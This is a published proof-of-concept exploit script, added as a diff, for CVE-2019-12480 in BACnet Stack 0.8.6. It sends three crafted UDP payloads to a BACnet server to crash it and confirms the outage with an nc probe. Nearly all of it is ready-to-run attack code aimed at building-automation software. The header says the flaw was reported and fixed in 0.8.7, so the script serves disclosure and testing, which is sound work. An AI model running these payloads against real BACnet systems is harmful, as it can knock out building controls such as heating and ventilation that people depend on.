@@ -1,0 +1,131 @@
+# Exploit Title: BACnet Stack 0.8.6 - Denial of Service
+# Google Dork: [if applicable]
+# Date: 2019-07-19
+# Exploit Author: mmorillo
+# Vendor Homepage: https://sourceforge.net/p/bacnet/
+# Software Link: https://sourceforge.net/projects/bacnet/files/bacnet-stack/bacnet-stack-0.8.6/
+# Version: bacnet-stack-0.8.6
+# Tested on: Linux
+# CVE: CVE-2019-12480
+
+#!/usr/bin/env python
+# 
+# After reported the bug to the vendor, sharing details
+# about the vulnerability, as well as proof-of-concept code (exploit code to 
+# test), has been release a fix for 0.8.7 release of 
+# BACnet Protocol Stack https://sourceforge.net/p/bacnet/
+
+import socket
+import struct
+import argparse
+import os
+import sys
+from termcolor import colored
+
+#------------------------------------------------------------------------------
+# Command line parser using argparse
+#------------------------------------------------------------------------------
+
+def cmdline_parser():
+    parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True,
+             description='BACnet Protocol Stack Segmentation fault leading to denial of service', version='0.1',
+             usage="python %(prog)s")
+
+    # Mandatory
+    parser.add_argument('Server', type=str, help='BACnet server IP')
+    parser.add_argument('Port', type=str, help='BACnet port')
+
+    return parser
+
+
+def get_Host_name_IP(): 
+    try: 
+        host_name = socket.gethostname() 
+        host_ip = socket.gethostbyname(host_name) 
+        return host_ip
+    except: 
+        print("Unable to get Hostname and IP") 
+
+
+def target_alive(BACnetServer, BACnetPort):
+    response = os.system("nc -u -z -w 1 " + BACnetServer + " " + str(BACnetPort))
+
+    if response == 0:
+        return True
+    else:
+        return False
+
+#------------------------------------------------------------------------------
+# Main of program
+#------------------------------------------------------------------------------
+
+def main():
+
+    # Get the command line parser.
+    parser = cmdline_parser()
+
+    # Show help if no args
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
+
+    # Get results line parser.
+    results = parser.parse_args()
+
+    BACnetServer = results.Server
+    BACnetPort = int(results.Port)
+    SRC_IP = get_Host_name_IP()
+
+    if not target_alive(BACnetServer, BACnetPort):
+        print((colored("[+] BACnet server down", "yellow")))
+
+    else:
+        if target_alive(BACnetServer, BACnetPort):
+
+            payload_DeviceCommunicationControl = "\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41"
+
+            print((colored("[+] Sending BACnet DeviceCommunicationControl payload from " + SRC_IP, "green")))
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+            s.connect((BACnetServer, BACnetPort))
+            s.send(struct.pack('>I',len(payload_DeviceCommunicationControl)))
+            s.send(payload_DeviceCommunicationControl)
+
+            print((colored("[+] Sent Payload: " + payload_DeviceCommunicationControl.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))
+
+        if target_alive(BACnetServer, BACnetPort):
+
+            payload_AtomicReadFile = "\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f"
+
+            print((colored("[+] Sending BACnet AtomicReadFile payload from " + SRC_IP, "green")))
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+            s.connect((BACnetServer, BACnetPort))
+            s.send(struct.pack('>I',len(payload_AtomicReadFile)))
+            s.send(payload_AtomicReadFile)
+
+            print((colored("[+] Sent Payload: " + payload_AtomicReadFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))
+
+        if target_alive(BACnetServer, BACnetPort):
+
+            payload_AtomicWriteFile = "\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f"
+
+            print((colored("[+] Sending BACnet AtomicWriteFile payload from " + SRC_IP, "green")))
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+            s.connect((BACnetServer, BACnetPort))
+            s.send(struct.pack('>I',len(payload_AtomicWriteFile)))
+            s.send(payload_AtomicWriteFile)
+
+            print((colored("[+] Sent Payload: " + payload_AtomicWriteFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))
+
+        if not target_alive(BACnetServer, BACnetPort):
+            print((colored("[+] DoS completed", "red")))
+
+
+#------------------------------------------------------------------------------
+# Main
+#------------------------------------------------------------------------------
+
+if __name__ == '__main__':
+    main()
